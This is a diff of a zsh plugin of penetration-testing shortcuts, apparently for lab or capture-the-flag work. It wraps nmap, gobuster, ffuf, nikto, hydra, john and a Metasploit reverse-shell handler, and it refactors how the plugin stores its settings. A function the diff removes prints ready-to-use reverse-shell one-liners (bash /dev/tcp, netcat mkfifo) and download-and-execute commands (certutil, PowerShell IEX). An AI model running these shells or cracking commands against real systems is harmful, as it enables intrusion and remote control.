@@ -1,10 +1,11 @@
 #!/usr/bin/env zsh
 
+
 #
 # VARIABLES
 #
 
-export CONF=~/.tg_hacker
+export TG_CONF=~/.tg_hacker
 export LIST_COMMON="/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt"
 export LIST_MEDIUM="/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
 export LIST_ROCK="/usr/share/wordlists/rockyou.txt"
@@ -22,10 +23,9 @@ alias hrock="hydra -VI -P $LIST_ROCK"
 alias jrock="john --wordlist=$LIST_ROCK"
 alias jshow="john --show"
 alias msf=msfconsole
-alias ngrok="ngrok http 80"
+#alias ngrok="ngrok http 80"
 alias p="~/.oh-my-zsh/custom/plugins/tg-hacker/play.py"
 alias s='sync'
-alias sshclean="ssh-keygen -R rhost; ssh"
 alias t1="tree -L 1"
 alias t2="tree -L 2"
 alias t3="tree -L 3"
@@ -35,7 +35,6 @@ alias vpnkill="sudo pkill openvpn"
 alias vpnshow="pgrep -a openvpn"
 alias wesng="/opt/wesng/wes.py -c --definitions /opt/wesng/definitions.zip systeminfo.txt"
 alias xc="xclip -sel c"
-
 
 #
 # FIND
@@ -67,8 +66,7 @@ add-host() {
 base() {
     if [[ "$1" == "set" ]]; then
         BASE=$(pwd)
-        sed -i "/^BASE=/d" $CONF
-        echo "BASE=$BASE" >> $CONF
+        tg-setvar BASE "$BASE"
     fi
     echo $BASE
     cd $BASE
@@ -83,53 +81,15 @@ focus() {
     [[ "$PORT" != "EMPTY" ]] && export RPORT="$PORT"
     # Add target to hosts file as rhost replacing as necessary
     add-host
-    # Add variables to sync $CONF file 
-    sed -i "/export RHOST=*/d" $CONF
-    echo "export RHOST=$RHOST" >> $CONF
-    sed -i "/export RPORT=*/d" $CONF
-    echo "export RPORT=$RPORT" >> $CONF
+    # Add variables to sync $TG_CONF file 
+    tg-setvar RHOST "$RHOST"
+    tg-setvar RPORT "$RPORT"
 }
-
-play() {
-    payloads=( \
-        "bash" \
-        "certutil" \
-        "netcat-bind" \
-        "netcat-rev" \
-        "ps_download" \
-        "ps_downx" \
-        "wget"\
-    )
-
-    if [ "$@" ]; then
-        payload="$1"
-    else
-        select payload in ${payloads[@]}; do
-            payload=$payload
-            break;
-        done
-    fi
-
-    case "$payload" in
-        bash) echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" ;;
-        certutil) echo "certutil -urlcache -split -f http://$LHOST/" ;;
-        netcat-bind) echo "mkfifo /tmp/f; nc -lvnp $LPORT < /tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/" ;;
-        netcat-rev)  echo "mkfifo /tmp/f; nc $LHOST $LPORT < /tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/f" ;;
-        ps_download) echo "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://$LHOST:80/','')\"" ;;
-        ps_downx) echo "powershell \"IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:80/shell.ps1')\"" ;;
-        wget) echo "wget http://$LHOST:80/" ;;
-        *)          
-            echo "NOPE" ;;
-    esac
-} 
 
 # Set local callback port
 lport() {
-    LPORT=${1:-"4444"} 
-    if [[ -f $CONF ]]; then
-        sed -i "/export LPORT=*/d" $CONF
-        echo "export LPORT=$LPORT" >> $CONF
-    fi
+    LPORT=${1:-"4444"}
+    tg-setvar LPORT "$LPORT"
     echo "LPORT: $LPORT"
 }
 
@@ -154,11 +114,8 @@ me() {
     iface=${1:-"eth0"}
     export LHOST=$(ifconfig $iface | grep "inet " | cut -b 9- | cut  -d" " -f2)
     echo -n $LHOST | xclip -selection c
-    if [[ -f $CONF ]]; then
-        sed -i "/export LHOST=*/d" $CONF
-        echo "export LHOST=$LHOST" >> $CONF
-    fi
     echo "LHOST: $LHOST"
+    tg-setvar LHOST "$LHOST"
 }
 
 # Copy rhost to clipboard
@@ -179,15 +136,37 @@ serve() {
     fi
 }
 
-# Sync env variables from $CONF file
+# Sync env variables from $TG_CONF file
 sync() {
-    [[ -f $CONF ]] ||  h-init
-    . $CONF
+    . $TG_CONF
     . ~/.oh-my-zsh/custom/plugins/tg-hacker/tg-hacker.plugin.zsh
     cd $BASE
     clear
-    [[ "$1" == "-v" ]] && cat $CONF
+    [[ "$1" == "-v" ]] && cat $TG_CONF
 }
+
+
+tg-setvar(){
+    if [[ $# < 2 ]]; then
+        echo "Wrong args"
+    fi
+    local var="$1"
+    local value="$2"
+    sed -i "/$var=/d" $TG_CONF
+    echo "export $var=$value" >> $TG_CONF
+}
+
+tg-init(){
+    cat << EOF > $TG_CONF
+#!/usr/bin/env zsh
+export LHOST=
+export LPORT=4444
+export RHOST=
+export RPORT=
+export BASE=
+EOF
+}
+
 
 #
 # HAK FUNCTIONS
@@ -199,13 +178,12 @@ h-init() {
     [[ -d $BASE ]] || mkdir -p $BASE
     cd $BASE
     BASE=$(pwd)
-    sed -i "/^BASE=/d" $CONF
-    echo "BASE=$BASE" >> $CONF
+    tg-setvar BASE $BASE
     touch notes.txt
 }
 
 h-enum4linux() {
-    OUTPUT="enum4linux.$RHOST"
+    OUTPUT="$RHOST-enum4linux.txt"
     enum4linux-ng $RHOST -oA $OUTPUT 
 }
 
@@ -213,7 +191,7 @@ h-ffuf(){
     PORT=${1:-80}
     HOST=${2:-$RHOST}
     WORDLIST=${3:-$LIST_COMMON}
-    OUTPUT=ffuf.$IP-$PORT.txt
+    OUTPUT="$IP-$PORT-nikto.txt"
     touch $OUTPUT
     ffuf -w $WORDLIST -u http://$HOST:$PORT/FUZZ -o $OUTPUT -of csv -c 
 }
@@ -222,7 +200,7 @@ h-gobuster(){
     PORT=${1:-80}
     HOST=${2:-$RHOST}
     WORDLIST=${3:-$LIST_COMMON}
-    OUTPUT=gobuster.$IP-$PORT.txt
+    OUTPUT="$IP-$PORT-gobuster.txt"
     touch $OUTPUT
     echo "gobuster dir -t 50 -o $OUTPUT -w $WORDLIST -u http://$HOST:$PORT -x html,php,txt,js,css,py"
     gobuster dir -t 50 -o $OUTPUT -w "$WORDLIST" -u http://"$HOST":"$PORT" -x html,php,txt,js,css,py
@@ -256,7 +234,7 @@ h-ssh() {
 h-web() {
     PORT=${1:-80}
     IP=${2:-$RHOST}
-    OUTPUT=$IP.nikto.txt
+    OUTPUT="$IP.nikto.txt"
     touch $OUTPUT
     whatweb -v -a 3 "$IP:$PORT" | tee $IP.whatweb.txt 
     nikto -host "$IP" -port "$PORT" -output $OUTPUT -Format txt
@@ -273,7 +251,9 @@ msf-handle() {
         "linux/x86/meterpreter/reverse_tcp" \
         "linux/x86/shell_reverse_tcp" \
         "windows/meterpreter/reverse_tcp" \
+        "windows/shell_reverse_tcp"
         "windows/x64/meterpreter/reverse_tcp" \
+        "windows/x64/shell_reverse_tcp" \
     )
 
     select PAYLOAD in "${payloads[@]}"; do
@@ -299,7 +279,6 @@ alias nmap-="sudo nmap -v -n -Pn -T4"
 #alias nmap-script-all="sudo nmap -v -n -Pn -T4 -sC -sV -p- -oN nmap.script.all.txt"
 #alias nmap-script="sudo nmap -v -n -Pn -T4 -sC -sV -oN nmap.script.txt"
 
-#nmap- () { sudo nmap -v -n -Pn -T4 ${1:-$RHOST} }
 nmap-arp()        { sudo nmap -v -n -sn -PR              -oN ${1:-$RHOST}-nmap-arp.txt ${1:-$RHOST} }
 nmap-basic()      { sudo nmap -v -n -Pn -T4              -oN ${1:-$RHOST}-nmap-basic.txt ${1:-$RHOST} }
 nmap-basic-all()  { sudo nmap -v -n -Pn -T4 -p-          -oN ${1:-$RHOST}-nmap-basic-all.txt ${1:-$RHOST} }
@@ -309,50 +288,50 @@ nmap-full-all()   { sudo nmap -v -n -Pn -T4 -A -p-       -oN ${1:-$RHOST}-nmap.f
 nmap-script()     { sudo nmap -v -n -Pn -T4 -sC -sV      -oN ${1:-$RHOST}-nmap.script.txt ${1:-$RHOST} }
 nmap-script-all() { sudo nmap -v -n -Pn -T4 -sC -sV -p-  -oN ${1:-$RHOST}-nmap.script.all.txt ${1:-$RHOST} }
 
-nmapper(){
-    local ACTION
-    local TARGET
+#nmapper(){
+    #local ACTION
+    #local TARGET
 
-    local base="sudo nmap -v -n -Pn -T4"
+    #local base="sudo nmap -v -n -Pn -T4"
 
-    PARAMS=""
-    while :; do
-        case "$1" in
-            -a|--action)
-                if [ -n "$2" ] && [ ${2:0:1} != "-" ]; then
-                    ACTION=$2
-                    shift 2
-                else
-                    exit 1
-                    echo "Error: Argument for $1 is missing" >&2
-                fi
-                ;;
-            -t|--target)
-                if [ -n "$2" ] && [ ${2:0:1} != "-" ]; then
-                    TARGET=$2
-                    shift 2
-                else
-                    exit 1
-                    echo "Error: Argument for $1 is missing" >&2
-                fi
-                ;;
-            -*|--*=) # unsupported flags
-                echo "Error: Unsupported flag $1" >&2
-                exit 1
-                ;;
-            *) # preserve positional arguments
-                PARAMS="$PARAMS $1"
-                shift
-                ;;
-        esac
-    done
-    # set positional arguments in their proper place
-    eval set -- "$PARAMS"
+    #PARAMS=""
+    #while :; do
+        #case "$1" in
+            #-a|--action)
+                #if [ -n "$2" ] && [ ${2:0:1} != "-" ]; then
+                    #ACTION=$2
+                    #shift 2
+                #else
+                    #exit 1
+                    #echo "Error: Argument for $1 is missing" >&2
+                #fi
+                #;;
+            #-t|--target)
+                #if [ -n "$2" ] && [ ${2:0:1} != "-" ]; then
+                    #TARGET=$2
+                    #shift 2
+                #else
+                    #exit 1
+                    #echo "Error: Argument for $1 is missing" >&2
+                #fi
+                #;;
+            #-*|--*=) # unsupported flags
+                #echo "Error: Unsupported flag $1" >&2
+                #exit 1
+                #;;
+            #*) # preserve positional arguments
+                #PARAMS="$PARAMS $1"
+                #shift
+                #;;
+        #esac
+    #done
+    ## set positional arguments in their proper place
+    #eval set -- "$PARAMS"
 
-    echo "$ACTION $TARGET"
+    #echo "$ACTION $TARGET"
 
 
-}
+#}
 
 nmap-ports(){
     IP=${1:-"$RHOST"}
@@ -363,8 +342,9 @@ nmap-ports(){
 nmap-parse-ports() {
     FILE=${1:-"nmap.ports.txt"} 
     RPORTS=$(cat $FILE | grep -P '^\d+' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//);
-    sed -i "/^export RPORTS=*/d" $CONF
-    echo "export RPORTS=$RPORTS" >> $CONF
+    sed -i "/^export RPORTS=*/d" $TG_CONF
+    echo "export RPORTS=$RPORTS" >> $TG_CONF
     echo "RPORTS=$RPORTS"
 }
 
+[[ -f $TG_CONF ]] || tg-init
